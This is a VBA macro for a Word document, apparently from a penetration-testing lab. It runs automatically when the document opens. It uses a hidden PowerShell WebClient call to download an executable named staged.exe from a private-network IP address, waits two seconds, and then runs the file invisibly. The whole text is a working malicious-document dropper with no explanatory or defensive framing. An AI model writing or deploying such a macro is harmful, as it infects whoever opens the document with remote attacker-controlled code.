Sub Document_Open()
	MyMacro
End Sub

Sub MyMacro()
	' Get the directory of the active document
	'docPath = ThisDocument.Path
	' Define the full path where you want to save the file
	'filePath = docPath & "\staged.exe"
	Dim str As String
	'str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.86.137/staged.exe','" & filePath & "')"
	str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.86.137/staged.exe','staged.exe')"
	Shell str, vbHide
	Dim exePath As String
	exePath = ActiveDocument.Path + "\staged.exe"
	Wait (2)
	Shell exePath, vbHide
End Sub
 
Sub Wait(n As Long)
	Dim t As Date
	t = Now
	Do
    	DoEvents
	Loop Until Now >= DateAdd("s", n, t)
End Sub

'Another wait function 
'Sub WaitUsingApplication() 
'Application.Wait (Now + TimeValue("00:00:05")) ' waits for 5 seconds 
'End Sub
